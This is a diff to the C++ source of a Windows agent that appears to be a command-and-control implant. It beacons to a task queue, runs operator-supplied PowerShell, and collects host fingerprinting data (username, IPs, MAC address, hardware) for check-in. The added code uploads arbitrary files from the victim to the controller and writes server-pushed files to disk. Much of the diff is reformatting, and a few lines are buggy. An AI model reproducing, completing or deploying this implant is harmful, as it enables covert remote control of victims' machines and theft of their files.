@@ -3,6 +3,7 @@
 #define _WIN32_WINNT 0x0600
 
 #include "Agent.h"
+#include "base64.hpp"
 
 #include <stdio.h>
 #include <winsock2.h>
@@ -16,21 +17,28 @@
 #include <array>
 #include <cmath>
 #include <cstdio>
+#include <filesystem>
+#include <fstream>
 #include <variant>
 
 #pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "ws2_32.lib")
 
-template<class... Ts> struct overloaded : Ts... { using Ts::operator()...; };
-template<class... Ts> overloaded(Ts...) -> overloaded<Ts...>;
+template <class... Ts>
+struct overloaded : Ts...
+{
+    using Ts::operator()...;
+};
+template <class... Ts>
+overloaded(Ts...) -> overloaded<Ts...>;
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 // Default constructor
 Agent::Agent(CommManager commManager, TaskQueueManager taskManager)
 {
-    commManager = commManager;
-    taskManager = taskManager;
+    this->commManager = commManager;
+    this->taskManager = taskManager;
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
@@ -54,47 +62,55 @@ void Agent::Start()
         {
             auto request = taskManager.GetNextTask();
 
-            Response result = std::visit(overloaded{
-                [this](const TaskRequest<CommandPowershell>& psRequest) -> Response {
-                    return this->ExecutePowerShell(psRequest.taskID, psRequest.data);
-                },
-                [](const auto& unhandledRequest) -> Response {
-                    return TaskResponse<TaskSuccess>{ };
-                }
-            }, request);
+            Response result = std::visit(overloaded{[](const TaskRequest<bool> &) -> Response
+                                                    {
+                                                        return CreateTaskResponse(0, NO_CODE, NO_CODE, TASK_ERROR,
+                                                                                  TaskError{1, "Unsupported task."});
+                                                    },
+                                                    [this](const TaskRequest<CommandUploadFile> &request) -> Response
+                                                    {
+                                                        return UploadFile(request.taskID, request.data);
+                                                    },
+                                                    [this](const TaskRequest<CommandDownloadFile> &request) -> Response
+                                                    {
+                                                        return DownloadFile(request.taskID, request.data);
+                                                    }},
+                                         request);
 
             taskManager.StoreTaskResult(result);
         }
+
         Sleep(5000);
     }
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-// Agent default commands 
+// Agent default commands
 
 void Agent::Exit()
 {
     ExitProcess(0);
 }
 
-Response Agent::GetUID(const int& taskID, const bool& isTrue) {
+Response Agent::GetUID(const int &taskID, const bool &isTrue)
+{
     char username[256];
     DWORD username_len = sizeof(username);
     // Get the username of the current user
     GetUserNameA(username, &username_len);
 
-    return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskSuccess{ username });
+    return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskSuccess{username});
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-Response Agent::ExecutePowerShell(const int& taskID, const CommandPowershell& psRequest)
+Response Agent::ExecutePowerShell(const int &taskID, const CommandPowershell &psRequest)
 {
     std::string result;
     std::string psCommand = "powershell.exe -Command \"" + psRequest.commandlet + "\"";
-    FILE* pipe = _popen(psCommand.c_str(), "r");
+    FILE *pipe = _popen(psCommand.c_str(), "r");
     if (!pipe)
     {
-        return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskError{ 0, "Failed to open process pipe." });
+        return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskError{0, "Failed to open process pipe."});
     }
 
     char buffer[128];
@@ -106,26 +122,27 @@ Response Agent::ExecutePowerShell(const int& taskID, const CommandPowershell& ps
 
     _pclose(pipe);
 
-    return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskSuccess{ result });
+    return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskSuccess{result});
 }
 
-
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-// Helpers 
+// Helpers
 std::string ConvertLPWSTRToStdString(LPWSTR lpwstr)
 {
-	if (!lpwstr) return "";	
-	int size = WideCharToMultiByte(CP_UTF8, 0, lpwstr, -1, NULL, 0, NULL, NULL);
+    if (!lpwstr)
+        return "";
+    int size = WideCharToMultiByte(CP_UTF8, 0, lpwstr, -1, NULL, 0, NULL, NULL);
 
-	if (size <= 0) return "";
-	std::string result(size - 1, 0);
-	WideCharToMultiByte(CP_UTF8, 0, lpwstr, -1, &result[0], size, NULL, NULL);
+    if (size <= 0)
+        return "";
+    std::string result(size - 1, 0);
+    WideCharToMultiByte(CP_UTF8, 0, lpwstr, -1, &result[0], size, NULL, NULL);
 
-	return result;
+    return result;
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-std::string Agent::CaptureCommandOutput(const std::string& cmd)
+std::string Agent::CaptureCommandOutput(const std::string &cmd)
 {
     std::array<char, 128> buffer;
     std::string result;
@@ -145,7 +162,7 @@ std::string Agent::CaptureCommandOutput(const std::string& cmd)
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-// Host metadata commands 
+// Host metadata commands
 std::string Agent::GetMotherBoard()
 {
     std::string cmd = "powershell -Command \"(Get-CimInstance Win32_BaseBoard).Product\"";
@@ -154,65 +171,69 @@ std::string Agent::GetMotherBoard()
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-BOOL Agent::GetUsername(OUT LPWSTR* szWhoamiStr)
+BOOL Agent::GetUsername(OUT LPWSTR *szWhoamiStr)
 {
-	DWORD dwSize = 0x00;
-	BOOL bResult = FALSE;
-	
-	if (!GetUserNameW(NULL, &dwSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
-	{
-		std::cout << "[x] GetUserNameW [%d] Failed With Error: %d \n", __LINE__, GetLastError();
-		goto _END_OF_FUNC;
-	}
+    DWORD dwSize = 0x00;
+    BOOL bResult = FALSE;
 
-	if (!(*szWhoamiStr = (LPWSTR)LocalAlloc(LPTR, dwSize * sizeof(WCHAR))))
-	{
-		std::cout << "[x] LocalAlloc Failed With Error: %d \n", GetLastError();
-		goto _END_OF_FUNC;
-	}
+    if (!GetUserNameW(NULL, &dwSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
+    {
+        std::cout << "[x] GetUserNameW [%d] Failed With Error: %d \n", __LINE__, GetLastError();
+        goto _END_OF_FUNC;
+    }
 
-	if (!GetUserNameW(*szWhoamiStr, &dwSize))
-	{
-		std::cout << "[x] GetUserNameW Failed With Error: %d \n", __LINE__, GetLastError();
-		goto _END_OF_FUNC;
-	}
+    if (!(*szWhoamiStr = (LPWSTR)LocalAlloc(LPTR, dwSize * sizeof(WCHAR))))
+    {
+        std::cout << "[x] LocalAlloc Failed With Error: %d \n", GetLastError();
+        goto _END_OF_FUNC;
+    }
 
-	bResult = TRUE;
+    if (!GetUserNameW(*szWhoamiStr, &dwSize))
+    {
+        std::cout << "[x] GetUserNameW Failed With Error: %d \n", __LINE__, GetLastError();
+        goto _END_OF_FUNC;
+    }
+
+    bResult = TRUE;
 
 _END_OF_FUNC:
-	if (!bResult && *szWhoamiStr)
-	{
-		LocalFree(*szWhoamiStr);
-	}
-	return bResult;
+    if (!bResult && *szWhoamiStr)
+    {
+        LocalFree(*szWhoamiStr);
+    }
+    return bResult;
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-std::string Agent::GetInternalIP() {
+std::string Agent::GetInternalIP()
+{
     ULONG outBufLen = 15000;
     std::vector<BYTE> buffer(outBufLen);
     PIP_ADAPTER_ADDRESSES pAddresses = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
 
     // Retrieve network adapter configurations
     DWORD dwRetVal = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen);
-    
-    if (dwRetVal == ERROR_BUFFER_OVERFLOW) {
+
+    if (dwRetVal == ERROR_BUFFER_OVERFLOW)
+    {
         buffer.resize(outBufLen);
         pAddresses = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
         dwRetVal = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen);
     }
 
-    if (dwRetVal == NO_ERROR) {
-        while (pAddresses) {
+    if (dwRetVal == NO_ERROR)
+    {
+        while (pAddresses)
+        {
             // Ignore loopback and inactive interfaces
-            if (pAddresses->IfType != IF_TYPE_SOFTWARE_LOOPBACK && pAddresses->OperStatus == IfOperStatusUp) {
+            if (pAddresses->IfType != IF_TYPE_SOFTWARE_LOOPBACK && pAddresses->OperStatus == IfOperStatusUp)
+            {
                 PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pAddresses->FirstUnicastAddress;
                 while (pUnicast)
                 {
                     if (pUnicast->Address.lpSockaddr->sa_family == AF_INET)
                     {
-                        sockaddr_in* sa_in = reinterpret_cast<sockaddr_in*>(pUnicast->Address.lpSockaddr);
-                        
+                        sockaddr_in *sa_in = reinterpret_cast<sockaddr_in *>(pUnicast->Address.lpSockaddr);
 
                         int b1 = sa_in->sin_addr.S_un.S_un_b.s_b1;
                         int b2 = sa_in->sin_addr.S_un.S_un_b.s_b2;
@@ -228,13 +249,15 @@ std::string Agent::GetInternalIP() {
             }
             pAddresses = pAddresses->Next;
         }
-    } 
+    }
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-std::string Agent::GetExternalViaDNS() {
+std::string Agent::GetExternalViaDNS()
+{
     WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return "";
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+        return "";
 
     struct addrinfo hints, *result = NULL;
     ZeroMemory(&hints, sizeof(hints));
@@ -242,13 +265,16 @@ std::string Agent::GetExternalViaDNS() {
     hints.ai_socktype = SOCK_STREAM;
 
     DWORD dwRetval = getaddrinfo("www.google.com", NULL, &hints, &result);
-    if (dwRetval == 0) {
-        struct sockaddr_in* sockaddr_ipv4 = (struct sockaddr_in*)result->ai_addr;
+    if (dwRetval == 0)
+    {
+        struct sockaddr_in *sockaddr_ipv4 = (struct sockaddr_in *)result->ai_addr;
         char ipStr[INET_ADDRSTRLEN];
         inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ipStr, INET_ADDRSTRLEN);
         return ipStr;
         freeaddrinfo(result);
-    } else {
+    }
+    else
+    {
         std::cerr << "DNS Query Failed." << std::endl;
     }
     WSACleanup();
@@ -256,36 +282,41 @@ std::string Agent::GetExternalViaDNS() {
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-std::string Agent::GetMachineMacAddress() {
-    ULONG bufferSize = 15000; 
+std::string Agent::GetMachineMacAddress()
+{
+    ULONG bufferSize = 15000;
     std::vector<BYTE> buffer(bufferSize);
-    
+
     ULONG flags = GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST;
     PIP_ADAPTER_ADDRESSES adapterList = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
 
     ULONG result = GetAdaptersAddresses(AF_UNSPEC, flags, NULL, adapterList, &bufferSize);
-    
-    if (result == ERROR_BUFFER_OVERFLOW) {
+
+    if (result == ERROR_BUFFER_OVERFLOW)
+    {
         buffer.resize(bufferSize);
         adapterList = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
         result = GetAdaptersAddresses(AF_UNSPEC, flags, NULL, adapterList, &bufferSize);
     }
 
-    if (result == NO_ERROR) {
-        for (PIP_ADAPTER_ADDRESSES adapter = adapterList; adapter != NULL; adapter = adapter->Next) {
-            if (adapter->OperStatus == IfOperStatusUp && adapter->PhysicalAddressLength == 6) {
+    if (result == NO_ERROR)
+    {
+        for (PIP_ADAPTER_ADDRESSES adapter = adapterList; adapter != NULL; adapter = adapter->Next)
+        {
+            if (adapter->OperStatus == IfOperStatusUp && adapter->PhysicalAddressLength == 6)
+            {
                 char macBuffer[18];
                 snprintf(macBuffer, sizeof(macBuffer), "%02X:%02X:%02X:%02X:%02X:%02X",
                          adapter->PhysicalAddress[0], adapter->PhysicalAddress[1],
                          adapter->PhysicalAddress[2], adapter->PhysicalAddress[3],
                          adapter->PhysicalAddress[4], adapter->PhysicalAddress[5]);
-                
-                return std::string(macBuffer); 
+
+                return std::string(macBuffer);
             }
         }
     }
 
-    return ""; 
+    return "";
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
@@ -309,7 +340,7 @@ int Agent::GetPID()
 int Agent::GetOSVersion()
 {
     PBYTE pSharedUserData = (PBYTE)0X7FFE0000;
-    return *(ULONG*)(pSharedUserData + 0x26C);
+    return *(ULONG *)(pSharedUserData + 0x26C);
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
@@ -324,7 +355,7 @@ int Agent::GetRAM()
         double totalRamGB = totalRamBytes / (1024.0 * 1024.0 * 1024.0);
         return static_cast<int>(std::round(totalRamGB));
     }
-    
+
     return 0;
 }
 
@@ -366,8 +397,7 @@ IntitalCheckinRequest Agent::GetHostInformation()
     GetUsername(&username);
     GetTotalDiskSize(&total, &free);
 
-    return IntitalCheckinRequest
-    {
+    return IntitalCheckinRequest{
         GetInternalIP(),
         GetExternalViaDNS(),
         "Windows " + std::to_string(GetOSVersion()),
@@ -377,9 +407,37 @@ IntitalCheckinRequest Agent::GetHostInformation()
         "High", // TODO Integrity
         GetMachineMacAddress(),
         GetMotherBoard(),
-        GetRAM(), 
-        total, 
-        free, 
-        GetCpuCount() 
-    };
+        GetRAM(),
+        total,
+        free,
+        GetCpuCount()};
+}
+
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+// File Transfer Commands
+Response Agent::UploadFile(const int &taskID, const CommandUploadFile &uploadRequest)
+{
+    const bool sent = commManager.SendFile(uploadRequest.path);
+    if (sent)
+        return CreateTaskResponse(taskID, UPLOAD, NO_CODE, SUCCESS,
+                                  TaskSuccess{"File uploaded successfully."});
+    return CreateTaskResponse(taskID, UPLOAD, NO_CODE, TASK_ERROR,
+                              TaskError{1, "File upload failed."});
+}
+
+Response Agent::DownloadFile(const int &taskID, const CommandDownloadFile &downloadRequest)
+{
+    const auto directory = std::filesystem::path("files");
+    std::filesystem::create_directories(directory);
+    const auto path = directory / std::filesystem::path(downloadRequest.path).filename();
+    const auto bytes = base64::from_base64(downloadRequest.data);
+    std::ofstream output(path, downloadRequest.offset == 0
+                                   ? std::ios::binary
+                                   : std::ios::binary | std::ios::app);
+    output.write(bytes.data(), static_cast<std::streamsize>(bytes.size()));
+    if (output)
+        return CreateTaskResponse(taskID, DOWNLOAD_2, DOWNLOAD, SUCCESS,
+                                  TaskSuccess{"File chunk stored."});
+    return CreateTaskResponse(taskID, DOWNLOAD_2, DOWNLOAD, TASK_ERROR,
+                              TaskError{1, "File chunk could not be stored."});
 }
